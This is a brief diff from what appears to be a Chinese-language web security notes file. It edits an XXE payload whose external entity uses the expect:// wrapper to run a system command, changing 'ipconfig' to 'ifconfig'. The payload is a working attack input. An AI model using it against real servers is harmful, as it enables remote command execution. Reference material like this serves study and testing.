@@ -1662,7 +1662,7 @@ payload,请先确定目标路径有这个文件
 ```XML
 <?xml version = "1.0"?>
 <!DOCTYPE ANY [
-    <!ENTITY f SYSTEM "expect://ipconfig">
+    <!ENTITY f SYSTEM "expect://ifconfig">
 ]>
 <x>&f;</x>
 ```
